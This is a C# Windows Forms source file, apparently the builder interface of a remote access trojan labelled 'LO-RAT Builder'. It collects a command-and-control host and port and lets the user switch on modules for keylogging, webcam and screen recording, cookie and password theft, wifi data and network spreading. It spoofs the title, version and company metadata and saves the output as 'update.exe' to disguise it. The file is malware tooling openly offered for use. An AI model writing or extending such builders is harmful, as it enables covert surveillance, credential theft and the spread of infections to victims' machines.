using System;
using System.Windows.Forms;
using System.IO;
using LO_Panel.Services;

namespace LO_Panel.Forms
{
    public partial class BuilderForm : Form
    {
        private ApiService api;
        
        public BuilderForm(ApiService apiService)
        {
            api = apiService;
            InitializeComponent();
        }
        
        private void btnBuild_Click(object sender, EventArgs e)
        {
            // Gather configuration from UI
            var config = new BuildConfig
            {
                C2Host = txtC2Host.Text,
                C2Port = (int)numPort.Value,
                Mutex = txtMutex.Text,
                Modules = new[] {
                    chkKeylogger.Checked ? "keylogger" : null,
                    chkScreenRec.Checked ? "screen_recorder" : null,
                    chkWebcam.Checked ? "webcam_recorder" : null,
                    chkCookieSteal.Checked ? "cookie_stealer" : null,
                    chkPasswordSteal.Checked ? "password_stealer" : null,
                    chkLiveScreen.Checked ? "live_screen" : null,
                    chkWifiInfo.Checked ? "wifi_info" : null,
                    chkNetSpread.Checked ? "net_spread" : null
                },
                IconPath = txtIconPath.Text,
                AssemblyInfo = new {
                    Title = txtTitle.Text,
                    Version = txtVersion.Text,
                    Company = txtCompany.Text
                }
            };
            
            // Send to server builder
            byte[] exe = api.BuildMalware(config);
            
            // Save to disk
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.Filter = "Executable|*.exe";
            sfd.FileName = "update.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                File.WriteAllBytes(sfd.FileName, exe);
                MessageBox.Show("Build complete: " + sfd.FileName, "LO-RAT Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
    }
}